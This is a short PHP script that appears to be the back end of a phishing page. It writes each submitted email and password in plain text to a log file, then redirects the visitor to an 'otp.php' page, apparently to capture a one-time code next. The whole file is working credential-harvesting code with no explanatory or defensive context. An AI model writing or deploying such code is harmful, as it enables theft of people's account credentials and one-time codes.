<?php

    file_put_contents("log.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
